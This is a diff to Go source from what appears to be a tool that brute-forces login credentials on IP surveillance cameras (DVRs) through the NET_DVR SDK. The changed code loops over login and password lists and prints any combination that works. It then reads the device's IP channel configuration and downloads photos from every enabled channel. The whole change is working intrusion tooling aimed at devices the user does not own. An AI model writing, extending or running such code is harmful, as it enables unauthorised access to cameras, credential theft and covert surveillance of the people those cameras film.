@@ -127,7 +127,7 @@ func grabShoots(ip string, uid int64, startChannel int, count int, login string,
   if (downloaded != 0) {
     info.Println("Downloaded", downloaded, "photos from", ip)
   } else {
-    info.Println("Can't get photos from", ip)
+    warn.Println("Can't get photos from", ip)
   }
 }
 
@@ -143,28 +143,38 @@ func bruteforce(ip string, results chan DeviceInfo) {
 
   for _, login := range logins {
     for _, password := range passwords {
-      var device C.NET_DVR_DEVICEINFO
+      var device C.NET_DVR_DEVICEINFO_V30
 
-      uid := (int64)(C.NET_DVR_Login(
+      uid := (int64)(C.NET_DVR_Login_V30(
         C.CString(ip),
         C.WORD(port),
         C.CString(login),
         C.CString(password),
-        (*C.NET_DVR_DEVICEINFO)(unsafe.Pointer(&device)),
+        (*C.NET_DVR_DEVICEINFO_V30)(unsafe.Pointer(&device)),
       ))
 
       if (uid >= 0) {
         succ.Printf("Logged in: %s:%s@%s\n", login, password, ip)
 
-        results <- DeviceInfo{
-          login,
-          password,
-          (uint8)(device.byStartChan),
-          (uint8)(device.byChanNum),
-          CameraAddress{ip, port},
-        }
-
         if (shoots_path != "") {
+          var ipcfg C.NET_DVR_IPPARACFG
+          var written int32
+
+          if (C.NET_DVR_GetDVRConfig(
+            (C.LONG)(uid),
+            C.NET_DVR_GET_IPPARACFG,
+            0,
+            (C.LPVOID)(unsafe.Pointer(&ipcfg)),
+            (C.DWORD)(unsafe.Sizeof(ipcfg)),
+            (*C.uint32_t)(unsafe.Pointer(&written)),
+          ) == 1) {
+            for i := 0; i < C.MAX_IP_CHANNEL && ipcfg.struIPChanInfo[i].byEnable == 1; i++ {
+              device.byChanNum++
+            }
+
+            device.byStartChan += 32
+          }
+
           grabShoots(
             ip,
             uid,
@@ -175,12 +185,18 @@ func bruteforce(ip string, results chan DeviceInfo) {
           )
         }
 
-        C.NET_DVR_Logout((C.LONG)(uid))
+        results <- DeviceInfo{
+          login,
+          password,
+          (uint8)(device.byStartChan),
+          (uint8)(device.byChanNum),
+          CameraAddress{ip, port},
+        }
+
+        C.NET_DVR_Logout_V30((C.LONG)(uid))
 
         return
       }
-
-      // serial := C.GoString((*C.char)(unsafe.Pointer(&device.sSerialNumber[0])))
     }
   }
 
